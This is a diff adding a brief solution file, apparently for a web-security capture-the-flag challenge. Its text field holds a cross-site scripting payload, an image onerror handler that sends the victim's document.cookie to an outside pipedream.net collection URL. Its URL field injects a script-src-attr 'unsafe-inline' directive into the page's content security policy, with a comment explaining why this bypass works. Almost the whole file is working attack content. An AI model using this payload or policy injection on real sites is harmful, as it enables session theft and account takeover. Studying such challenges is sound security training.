@@ -1,0 +1,4 @@
+SOLUTION:
+TEXT: <img src=x onerror="document.location='https://enjlj8ww980ng.x.pipedream.net/?' + document.cookie;">
+NAME: *what u want*
+URL: ; script-src-attr 'unsafe-inline'  #it is written in the header of CSP and it allows the execution of in-line scripts (important: it is a directive that is not already present in the CSP --> overwriting a directive that is present doesn't work).
